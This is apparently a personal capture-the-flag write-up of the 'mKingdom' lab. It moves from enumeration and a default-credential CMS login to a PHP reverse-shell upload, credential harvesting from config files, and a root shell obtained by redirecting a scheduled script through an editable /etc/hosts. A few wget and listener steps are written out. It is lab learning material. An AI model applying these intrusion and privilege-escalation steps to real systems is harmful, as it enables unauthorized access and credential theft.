# CTF Writeup: mKingdom

---

- Step 1: Checked out website --> not available, made nmap scan --> port 85 available
- Step 2: website available under port 85, but didn't find anything in the source code or on the website itself.
- Step 3: Captured website request on burp and tried to gather any information, but also didn't work
- Step 4: Continued with Enumeration by running gobuster and found hidden dir --> /app --> went on website
and found jump button --> clicked on it and got forwarded to /app/castle, new website.
- Step 5: After falling for a lot of rabbit holes, I gained access onto the login page of /castle by just typing
default creds in "admin" & "password"
- Step 6: After some time I found out a possible option to gain a reverse shell, we are able to set allowed file
types and also upload those files into the web-server.
- Step 7: Found Concrete CMS Rev Shell Exploit for File Manager, Generated php rev shell script, with hack-tools
extension.
- Step 8: stored in a file and uploaded it to web-server, created listener and executed file. --> gained rev shell
- Step 9: checked privileges, almost no access to anything and no tty, so I checked out 
var/www/html/app/castle/application/config/database.php and found toad's creds
- Step 10: couldn't made "su", so I had to stabilize shell, after stabilizing it with tty commands in hack-tools extension
gained access to user toad
- Step 11: found PWD_token and decoded the base64 string and found password for mario --> logged in with su mario
- Step 12: on home/desktop I found the user flag, since I couldn't cat it. I created a user.txt file in /tmp and
cp'd the userflag into /tmp/user.txt and made cat --> gained userflag
- Step 13: Since I cannot access root priv's, I tried to use LinPEAS to coordinate my decisions.
--> chmod +x linpeas.sh
- Step 14: Made an python server on port 80 "python3 -m http.server 80" and made locate linpeas.sh and cp'd path
- Step 15: after made request from web server to my machine ip to receive linpeas.sh 
--> "wget http://target_ip/linpeas.sh" --> result is 200 went through and got saved within /tmp directory
- Step 16: made chmod +x linpeas.sh, because I didn't have execute privs -> made ./linpeas.sh
- Step 17: LinPeas didn't give me any good tips, so I searched all dir's and files, found that /etc/hosts is 
edtiable & there is an script getting loaded into mkingdom.thm domain. Looked up for a tcp reverse shell, created 
listener on 4242, wget http://my ip/my script into target web server. hosted an python3 server on port 85,
and executed script on target web server, gained reverse shell on my listener + root privs. cd /root --> cat root.txt
gained root flag.

---

## Key Learnings

- This CTF was the hardest I've ever done, because I wasted so much time by falling in rabbitholes and had to look
up tutorials a lot.
- Increased linux cli knowledge --> echo "String-value" | base64 -d, wget
- Increased LinPeas Knowledge
- Increased Shell Knowledge --> How to improve shell stabilization and which benefits come with it.
- Gained Hack-Tools Extension
- Gained Knowledge about in which dir's I should look into Real world Scenarios --> OSCP --> www, databases (e.G php)

